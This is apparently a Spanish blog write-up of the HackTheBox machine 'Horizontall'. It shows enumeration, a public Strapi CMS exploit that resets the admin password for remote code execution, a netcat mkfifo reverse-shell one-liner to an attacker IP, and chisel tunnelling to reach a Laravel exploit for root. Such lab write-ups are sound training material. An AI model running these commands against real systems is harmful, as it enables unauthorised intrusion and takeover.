---
layout      : post
title       : "Horizontall - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Horizontall-HackTheBox/Horizontall.webp
category    : [ htb ]
tags        : [ Linux ]
---

🚀👨‍🚀En esta máquina Linux de nivel easy obtendré acceso al sistema a través de una vulnerabilidad RCE en Strapi CMS y escalaré privilegios aprovechando una vulnerabilidad explotada a través de Laravel usando chisel🚀👨‍🚀.

🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)


[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Enumeración Web](#enumeración).
3. [Explotación](#explotación).
4. [Escalada de Privilegios](#priv-esc).


***

Ya es hora de estar hack asique al liooo a romper la máquina Horizontall!!!!!

![](/assets/images/HTB/Horizontall-HackTheBox/hack.gif)


# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como de costumbre comienzo lanzando la herramienta whichsystem.py para identificar el sistema operativo de la máquina a la que me voy a enfrentar.

Esta herramienta se basa en el TTL (Time To Live).

```bash
# Windows --> TTL 128
---------------------
# Linux --> TTL 64
```

```bash
❯ whichSystem.py 10.10.11.105

	10.10.11.105 (ttl -> 63): Linux
```

Una vez ya se que me enfrento a una máquina Linux procedo al escaneo de puertos convenvencional con la herramienta nmap.

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Existen solo dos puertos abiertos, el puerto 80 (http) y el puerto 22 ssh.

Pero necesito más información acerca de estos puertos por lo que debo realizar un escaneo un poco más detallado...

```bash
# Escaneo para detectar versiones del servicio que corre en cada puerto
nmap -p80,22 -n -Pn -sCV 10.10.11.105 -oN versiones
-----------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A continuación dejo en una tabla la información relevante que he extraido del escaneo nmap.

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 |
| 80     | HTTP     | nginx 1.14.0 |

> Dominio horizontall.htb 

Añado el dominio encontrado al archivo /etc/hosts.

# Enumeración Web [#](enumeración) {#enumeración}

Una vez añadido lo siguiente es proceder con la enumeración web, ya que existe el puerto 80 abierto.

Accedo al dominio desde el navegador para ojear un poco la web.

![](/assets/images/HTB/Horizontall-HackTheBox/web1.webp)

Tras investigar un poco no encuentro nada relevante, por lo que decido fuzzear rutas en el servidor, en este caso usaré gobuster.

![](/assets/images/HTB/Horizontall-HackTheBox/gobuster.webp)

Tras fuzzear no encuentro nada interesante por lo que solo se me ocurre fuzzear para encontrar algún vhost, y en esta ocasión lo haré con la herramienta wfuzz.

Pero tampoco encuentro ningún vhost, por lo que vuelvo al navegador y procedo a mirar el código fuente de la web, descubriendo que hay varios archivos .js.

Tras buscar durante un rato encuentro un vhost dentro de uno de los archivos .js

Dentro de la ruta: `http://horizontall.htb/js/app.c68eb462.js`

> api-prod.horizontall.htb

Añado el vhost al archivo /etc/hosts y abro el navegador de nuevo para ver que encuentro.

![](/assets/images/HTB/Horizontall-HackTheBox/web2.webp)

No hay nada más por lo que fuzzeo de nuevo para descubrir rutas en el servidor.

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000128:   200        0 L      21 W       507 Ch      "reviews"                                                                                                                  
000000250:   200        16 L     101 W      854 Ch                   "admin"                                                                                                                    
000001600:   200        0 L      21 W       507 Ch      "Reviews" 
```

Accedo a la ruta admin que seguramente será un login y podría obtener algo de información sobre la web.

![](/assets/images/HTB/Horizontall-HackTheBox/login.webp)


# Explotación [#](explotación) {#explotación}

Puedo ver que estoy ante un cms llamado strapi, por lo que lo primero que haré será buscar alguna vulnerabilidad.

![](/assets/images/HTB/Horizontall-HackTheBox/searchsploit.webp)

Encuentro dos exploits, y no necesito estar autenticado, por lo que uso uno de ellos, en concreto el que esta programado en python.

Este exploit lo que hace es cambiar las credenciales de acceso y me otorgaría acceso al panel de strapi, además de la posibilidad de ejecutar comandos, es decir RCE.

Una vez lo tengo lo ejecuto:

```bash
❯ python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjcwODg1MjAzLCJleHAiOjE2NzM0NzcyMDN9.TzMLnnxxwD-dM_EsAHrqjxnC3m-GiBDKf1tRGtc-XsM
```

Aprovechando el RCE que me otorga el exploit, introduzco una reverse shell netcat.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.12 443 >/tmp/f
```

```bash
$>  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.12 443 >/tmp/f
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

Y porfin consigo acceso al sistema.

![](/assets/images/HTB/Horizontall-HackTheBox/shell.webp)

A continuación actulizo la tty para tener una shell más interactiva y funcional.


# Escalada de Privilegios [#](priv-esc) {#priv-esc}


Lanzo linpeas.sh para encontrar una vía potencial de escalada de privilegios.

![](/assets/images/HTB/Horizontall-HackTheBox/linpeas.webp)

Tras lanzarlo encuentro que el puerto 8000 se encuentra abierto en el sistema, por lo que hago un curl a la ip y al puerto para ver que encuentro.

![](/assets/images/HTB/Horizontall-HackTheBox/laravel.webp)

Descubro que en el puerto 8000 corre Laravel v8 (PHP v7.4.18), por lo que busco si existe alguna vulnerabilidad para escalar privilegios.

Buscando información encuentro el siguiente exploit.

Por lo que lo descargo y lo ejecuto.

![](/assets/images/HTB/Horizontall-HackTheBox/exploit.webp)

Pero me arroja un error al lanzarlo, por lo que decido usar chisel para poder traerme el puerto de la máquina víctima a la mía.

Por lo que primero descargo chisel en mi máquina y luego lo paso a la máquina víctima ya que será necesario ejecutarlo en las dos máquinas.

```bash
# En la máquina atacante
------------------------
./chisel server --reverse -p 1234
```

```bash
# En la máquina víctima
-----------------------
./chisel client http://10.10.14.12:1234 R:8001:127.0.0.1:8000
```

Una vez ejecutamos los dos comandos ya podremos acceder desde nuestra máquina atacante al puerto 8000 donde se encuentra laravel.

![](/assets/images/HTB/Horizontall-HackTheBox/laravel2.webp)

Ahora ya puedo ejecutar el exploit desde mi máquina atacante.

![](/assets/images/HTB/Horizontall-HackTheBox/root.webp)

![](/assets/images/HTB/Horizontall-HackTheBox/pwned.webp)



